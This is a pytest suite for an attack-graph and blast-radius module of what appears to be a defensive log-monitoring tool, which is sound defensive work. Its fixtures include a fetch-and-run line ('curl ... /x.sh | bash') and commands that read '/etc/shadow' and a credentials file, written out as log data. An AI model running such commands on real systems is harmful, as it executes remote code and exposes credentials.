"""Phase 8 — attack-path graphing and blast radius.

The blast-radius tests carry the weight here. A graph traversal that ignores edge
direction, edge type, or time will happily report a number, and the number will be
wrong in a direction that makes an incident look worse than it was — which is how
an operator learns to stop believing the tool.
"""

from __future__ import annotations

import pytest

from sentinel.graph import AttackGraph, build_graph, extract_paths, summarise
from sentinel.schemas import LogEvent

T0 = "2026-07-30T05:30:00Z"


def event(ts: str = T0, **kwargs) -> LogEvent:
    defaults = {
        "raw_sha256": kwargs.get("raw_sha256", f"h{ts}{kwargs.get('user', '')}{kwargs.get('source_ip', '')}"),
        "timestamp": ts,
        "severity": "warning",
        "score": 54,
        "host": "sentinel",
    }
    defaults.update(kwargs)
    return LogEvent(**defaults)


def at(minute: int, second: int = 0) -> str:
    return f"2026-07-30T05:{minute:02d}:{second:02d}Z"


class TestExtractPaths:
    def test_finds_absolute_paths(self):
        assert extract_paths("cat /etc/.backup_credentials") == ["/etc/.backup_credentials"]

    def test_skips_ubiquitous_binaries(self):
        # /bin/bash appears in half of all sudo lines and says nothing.
        assert extract_paths("/bin/bash -c 'id'") == []

    def test_ignores_flags_and_urls(self):
        assert extract_paths("curl -s http://198.51.100.9/x.sh | bash") == []

    def test_handles_empty(self):
        assert extract_paths("") == []

    def test_caps_the_count(self):
        command = " ".join(f"/opt/data/file{i}" for i in range(20))
        assert len(extract_paths(command)) <= 5


class TestBuildGraph:
    def test_login_creates_a_typed_edge(self):
        graph = build_graph([event(source_ip="203.0.113.45", user="arron", outcome="success")])
        assert graph.edges[("source_ip:203.0.113.45", "user:arron", "auth_success")].count == 1

    def test_failure_and_success_are_different_edges(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", outcome="failure"),
            event(source_ip="1.2.3.4", user="a", outcome="success", raw_sha256="x"),
        ])
        kinds = {kind for (_s, _d, kind) in graph.edges}
        assert kinds == {"auth_failure", "auth_success"}

    def test_only_success_grants_access(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", outcome="failure"),
            event(source_ip="1.2.3.4", user="b", outcome="success", raw_sha256="x"),
        ])
        assert graph.edges[("source_ip:1.2.3.4", "user:b", "auth_success")].grants_access
        assert not graph.edges[("source_ip:1.2.3.4", "user:a", "auth_failure")].grants_access

    def test_sudo_becomes_an_escalation_edge(self):
        graph = build_graph([event(
            user="arron", process="sudo",
            fields={"target_user": "root", "command": "/bin/cat /etc/shadow"},
        )])
        assert ("user:arron", "user:root", "escalated_to") in graph.edges
        assert ("user:root", "file:/etc/shadow", "accessed") in graph.edges

    def test_repeated_interactions_are_counted_not_duplicated(self):
        events = [event(at(30, i), source_ip="1.2.3.4", user="a", outcome="failure",
                        raw_sha256=f"h{i}") for i in range(5)]
        graph = build_graph(events)
        assert len(graph.edges) == 1
        assert next(iter(graph.edges.values())).count == 5

    def test_node_carries_peak_severity(self):
        graph = build_graph([
            event(source_ip="1.2.3.4", user="a", severity="warning", score=54),
            event(source_ip="1.2.3.4", user="a", severity="critical", score=97, raw_sha256="x"),
        ])
        assert graph.nodes["source_ip:1.2.3.4"].peak_severity == "critical"

    def test_honeytoken_is_tagged(self):
        graph = build_graph([event(
            source_ip="1.2.3.4", user="admin_backup",
            fields={"honeytoken": "admin_backup", "honeytoken_kind": "user"},
        )])
        assert "honeytoken" in graph.nodes["user:admin_backup"].tags

    def test_empty_input_is_an_empty_graph(self):
        graph = build_graph([])
        assert graph.nodes == {} and graph.shapes() == []


class TestBlastRadius:
    def _chain_graph(self) -> AttackGraph:
        """source → arron → root → /etc/secret, in chronological order."""
        return build_graph([
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/bin/cat /etc/secret"}),
        ])

    def test_follows_the_chain(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=4)
        labels = set(radius)
        assert "user:arron" in labels
        assert "user:root" in labels
        assert "file:/etc/secret" in labels

    def test_hop_counts_are_correct(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=4)
        assert radius["source_ip:203.0.113.45"] == 0
        assert radius["user:arron"] == 1
        assert radius["user:root"] == 2

    def test_max_hops_truncates(self):
        radius = self._chain_graph().blast_radius("source_ip:203.0.113.45", max_hops=1)
        assert "user:arron" in radius
        assert "user:root" not in radius

    def test_failed_logins_do_not_extend_the_radius(self):
        # The number an operator needs is what the attacker reached, not what
        # they knocked on.
        graph = build_graph([
            event(at(30), source_ip="1.2.3.4", user="victim", outcome="failure", raw_sha256="a"),
            event(at(31), user="victim", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/bin/cat /etc/secret"}),
        ])
        radius = graph.blast_radius("source_ip:1.2.3.4", max_hops=4)
        assert "user:victim" not in radius, "a failed login granted nothing"
        assert len(radius) == 1

    def test_ignores_edges_that_predate_the_attacker(self):
        # The failure mode that makes naive attack graphs over-report: root ran a
        # cron job before the intrusion, and plain reachability claims the
        # attacker touched it.
        graph = build_graph([
            event(at(10), user="root", process="cron", raw_sha256="old",
                  fields={"command": "/usr/local/bin/nightly-backup"}),
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/attacker-loot"}),
        ])
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=5)
        reached = {graph.nodes[n].label for n in radius}
        assert "/etc/attacker-loot" in reached
        assert "/usr/local/bin/nightly-backup" not in reached, "walked backwards through time"

    def test_time_constraint_can_be_disabled(self):
        graph = build_graph([
            event(at(10), user="root", process="cron", raw_sha256="old",
                  fields={"command": "/usr/local/bin/nightly-backup"}),
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/loot"}),
        ])
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=5, respect_time=False)
        assert "file:/usr/local/bin/nightly-backup" in radius

    def test_a_later_shortcut_does_not_truncate_the_radius(self):
        # Relaxation, not first-visit-wins: reaching `root` early via one route
        # must not freeze an arrival time that forbids onward edges.
        graph = build_graph([
            event(at(20), source_ip="1.2.3.4", user="root", outcome="success", raw_sha256="early"),
            event(at(40), user="root", process="bash", raw_sha256="late",
                  fields={"command": "/etc/late-loot"}),
        ])
        radius = graph.blast_radius("source_ip:1.2.3.4", max_hops=4)
        assert "file:/etc/late-loot" in radius

    def test_unknown_seed_is_empty_not_an_error(self):
        assert self._chain_graph().blast_radius("source_ip:9.9.9.9") == {}


class TestShapes:
    def test_star_is_detected(self):
        graph = build_graph([
            event(at(30, i), source_ip="203.0.113.45", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["admin", "oracle", "test", "root"])
        ])
        stars = [s for s in graph.shapes() if s.name == "star"]
        assert stars and stars[0].centre == "source_ip:203.0.113.45"
        assert len(stars[0].members) == 4

    def test_star_below_threshold_is_not_reported(self):
        graph = build_graph([
            event(at(30, i), source_ip="1.2.3.4", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["a", "b"])
        ])
        assert not [s for s in graph.shapes() if s.name == "star"]

    def test_a_successful_star_outranks_a_failed_one(self):
        failed = build_graph([
            event(at(30, i), source_ip="1.1.1.1", user=u, outcome="failure", raw_sha256=f"f{i}")
            for i, u in enumerate(["a", "b", "c"])
        ]).shapes()[0]
        succeeded = build_graph(
            [event(at(30, i), source_ip="2.2.2.2", user=u, outcome="failure", raw_sha256=f"s{i}")
             for i, u in enumerate(["a", "b", "c"])]
            + [event(at(31), source_ip="2.2.2.2", user="a", outcome="success", raw_sha256="win")]
        ).shapes()[0]
        assert succeeded.score > failed.score
        assert succeeded.severity == "critical"

    def test_funnel_is_detected(self):
        # Many sources on one account: chosen, not swept up.
        graph = build_graph([
            event(at(30, i), source_ip=f"203.0.113.{i}", user="arron",
                  outcome="failure", raw_sha256=f"h{i}")
            for i in range(1, 5)
        ])
        funnels = [s for s in graph.shapes() if s.name == "funnel"]
        assert funnels and funnels[0].centre == "user:arron"

    def test_chain_is_detected(self):
        graph = build_graph([
            event(at(30), source_ip="203.0.113.45", user="arron", outcome="success", raw_sha256="a"),
            event(at(31), user="arron", process="sudo", raw_sha256="b",
                  fields={"target_user": "root", "command": "/etc/secret"}),
        ])
        chains = [s for s in graph.shapes() if s.name == "chain"]
        assert chains
        assert len(chains[0].members) >= 3

    def test_bridge_is_detected(self):
        # One account successfully accessed from two unrelated origins.
        graph = build_graph([
            event(at(30), source_ip="203.0.113.1", user="deploy", outcome="success", raw_sha256="a"),
            event(at(31), source_ip="198.51.100.9", user="deploy", outcome="success", raw_sha256="b"),
        ])
        bridges = [s for s in graph.shapes() if s.name == "bridge"]
        assert bridges and bridges[0].centre == "user:deploy"
        assert bridges[0].severity == "critical"

    def test_shapes_are_bilingual(self):
        graph = build_graph([
            event(at(30, i), source_ip="203.0.113.45", user=u, outcome="failure", raw_sha256=f"h{i}")
            for i, u in enumerate(["admin", "oracle", "test"])
        ])
        for shape in graph.shapes():
            assert shape.description_en and shape.description_ja
            assert any(ord(ch) > 0x3000 for ch in shape.description_ja)

    def test_quiet_traffic_produces_no_shapes(self):
        graph = build_graph([event(at(30), source_ip="192.168.1.5", user="arron", outcome="success")])
        assert graph.shapes() == []


class TestExport:
    def test_dot_is_wellformed(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="arron", outcome="success")])
        dot = graph.to_dot()
        assert dot.startswith("digraph sentinel {") and dot.rstrip().endswith("}")
        assert dot.count("->") == len(graph.edges)

    def test_dot_escapes_quotes(self):
        graph = build_graph([event(user='we"ird', process="bash",
                                   fields={"command": '/tmp/a"b'})])
        assert '\\"' in graph.to_dot()

    def test_to_dict_shape(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="arron", outcome="success")])
        payload = graph.to_dict(seed="source_ip:1.2.3.4", max_hops=2)
        assert payload["stats"]["nodes"] == len(graph.nodes)
        assert payload["blast_radius"]["seed"] == "source_ip:1.2.3.4"
        assert payload["kind_order"][0] == "source_ip"
        assert all("hops" in n for n in payload["nodes"])

    def test_to_dict_without_a_seed_has_no_radius(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="a", outcome="success")])
        assert graph.to_dict()["blast_radius"] is None

    def test_networkx_export_is_optional_and_explains_itself(self):
        graph = build_graph([event(source_ip="1.2.3.4", user="a", outcome="success")])
        try:
            import networkx  # noqa: F401
        except ImportError:
            with pytest.raises(RuntimeError, match="optional"):
                graph.to_networkx()
        else:
            assert graph.to_networkx().number_of_nodes() == len(graph.nodes)


class TestAgainstTheDemoFixture:
    def test_reconstructs_the_intrusion(self, engine):
        graph = engine.attack_graph()
        names = {s.name for s in graph.shapes()}
        assert "star" in names, "the brute-force fan-out should be visible"
        assert "chain" in names, "the completed kill chain should be visible"

    def test_the_star_centres_on_the_attacker(self, engine):
        graph = engine.attack_graph()
        star = next(s for s in graph.shapes() if s.name == "star")
        assert star.centre == "source_ip:203.0.113.45"

    def test_blast_radius_excludes_pre_attack_activity(self, engine):
        graph = engine.attack_graph()
        radius = graph.blast_radius("source_ip:203.0.113.45", max_hops=4)
        reached = {graph.nodes[n].label for n in radius}
        # certbot ran via cron before the attack; root is a shared node.
        assert "/usr/bin/certbot" not in reached
        assert "/etc/.backup_credentials" in reached, "the canary file WAS reached"

    def test_summary_is_compact(self, engine):
        info = summarise(engine.attack_graph())
        assert info["nodes"] > 0 and len(info["shapes"]) <= 5


class TestShapeDetectionScales:
    """Shape detection runs synchronously on every /api/graph request, over a
    buffer of up to 20,000 events, and the quantities driving its cost — distinct
    source addresses, distinct accounts — are chosen by whoever is attacking the
    host.

    The original implementation was cubic: _chains asked for a fresh traversal
    per (source, target) pair, and three other detectors scanned every edge once
    per node. Measured 0.06s at 100 events, 4.5s at 400, 40s at 800, 330s at
    1600. A dashboard poll during a distributed scan would have hung the server
    for hours — a denial of service triggered by the attack the graph exists to
    display.

    These tests pin the work bound rather than the wall clock, because a timing
    assertion tight enough to catch a regression is also tight enough to flake on
    a loaded CI runner.
    """

    @staticmethod
    def _scan(n_sources: int, succeed: bool) -> list[LogEvent]:
        """A scan from n distinct addresses, all failing or all succeeding."""
        out = []
        for i in range(n_sources):
            ip = f"203.0.{i // 256 % 256}.{i % 256}"
            out.append(event(
                at(i % 60, i % 60),
                raw_sha256=f"{i:064x}",
                source_ip=ip,
                user=f"user{i % 20}",
                rule="ssh_accepted_login" if succeed else "ssh_failed_password",
                outcome="success" if succeed else "failure",
                category="authentication",
                message=f"{'Accepted' if succeed else 'Failed'} password for user{i % 20} from {ip}",
                fields={"command": f"/usr/bin/tool{i} /var/data/file{i}"},
            ))
        return out

    def _count_traversals(self, graph, monkeypatch) -> int:
        calls = {"n": 0}
        original = type(graph)._deepest_route

        def counting(self, src, targets):
            calls["n"] += 1
            return original(self, src, targets)

        monkeypatch.setattr(type(graph), "_deepest_route", counting)
        graph.shapes()
        return calls["n"]

    def test_sources_that_never_got_access_cost_no_traversal(self, monkeypatch):
        """The realistic explosion: thousands of addresses that only ever failed.

        A failed login grants nothing, so such a source cannot begin a chain and
        must be rejected by a dict lookup. The old code still paid a function
        call per (source, target) pair to reach the same conclusion, and that
        overhead alone was the bulk of the 330 seconds.
        """
        graph = build_graph(self._scan(2000, succeed=False))
        assert self._count_traversals(graph, monkeypatch) == 0

    def test_traversals_are_bounded_when_every_source_succeeds(self, monkeypatch):
        """Pruning handles the scan; it does not bound credential stuffing that
        works. Chains are a ranked finding, so the work is capped where the
        output stops being readable.

        The bound asserted here is deliberately *not* MAX_CHAIN_SOURCES. Checking
        the work against the very constant that limits it is circular — raising
        the constant raises the assertion with it, so the test would keep passing
        as the cap was loosened to uselessness. The first version of this test
        did exactly that, and was confirmed to still pass with the cap set to
        100,000. What matters is that the work is sub-linear in the number of
        attacker-supplied sources, so that is what is measured.
        """
        n_sources = 2000
        graph = build_graph(self._scan(n_sources, succeed=True))
        assert len([n for n, node in graph.nodes.items() if node.kind == "source_ip"]) == n_sources

        calls = self._count_traversals(graph, monkeypatch)
        assert calls < n_sources, (
            f"{calls} traversals for {n_sources} successful sources — the work "
            f"still grows with attacker-controlled input. The cap is gone."
        )
        # An absolute ceiling too, so a cap that exists but is set absurdly high
        # is still a failure.
        assert calls <= 500, f"{calls} traversals is more work than any analyst will read"

    def test_shape_output_is_capped_and_ranked(self):
        """Ten thousand shapes would be unreadable as well as expensive, and the
        cut must drop the least severe rather than an arbitrary slice."""
        from sentinel.graph import MAX_SHAPES

        graph = build_graph(self._scan(2000, succeed=True))
        shapes = graph.shapes()
        assert len(shapes) <= MAX_SHAPES
        scores = [s.score for s in shapes]
        assert scores == sorted(scores, reverse=True)

    def test_truncation_is_deterministic(self):
        """Two runs over the same events must truncate to the same findings.
        Sorting on score alone left ties in dict order, so the dashboard could
        show a different 'top' shape on each poll with nothing having changed."""
        events = self._scan(500, succeed=True)
        first = [(s.name, s.centre, s.score) for s in build_graph(events).shapes()]
        second = [(s.name, s.centre, s.score) for s in build_graph(events).shapes()]
        assert first == second

    def test_deepest_route_matches_the_pairwise_definition(self):
        """The optimisation must not change the answer.

        The shape wanted is the longest access route from a source to any file or
        process. This checks the single-traversal implementation against the
        definition it replaced — asking for each target's path and keeping the
        longest.
        """
        events = [
            event(at(1), source_ip="203.0.113.9", user="svc", outcome="success",
                  category="authentication", rule="ssh_accepted_login",
                  message="Accepted password for svc from 203.0.113.9"),
            event(at(2), user="svc", rule="sudo_command_executed",
                  category="privilege-escalation", outcome="success",
                  message="svc : COMMAND=/usr/bin/id",
                  fields={"target_user": "root", "command": "/usr/bin/id"}),
            event(at(3), user="root", rule="sudo_command_executed",
                  category="privilege-escalation", outcome="success",
                  message="root : COMMAND=/bin/cat /etc/shadow",
                  fields={"command": "/bin/cat /etc/shadow"}),
        ]
        graph = build_graph(events)
        targets = {n for n, node in graph.nodes.items() if node.kind in {"file", "process"}}
        for src, node in graph.nodes.items():
            if node.kind != "source_ip":
                continue
            reference: list[str] = []
            for dst in targets:
                route = graph.path(src, dst, access_only=True)
                if len(route) > len(reference):
                    reference = route
            got = graph._deepest_route(src, targets)
            assert len(got) == len(reference), f"{src}: {got} vs {reference}"
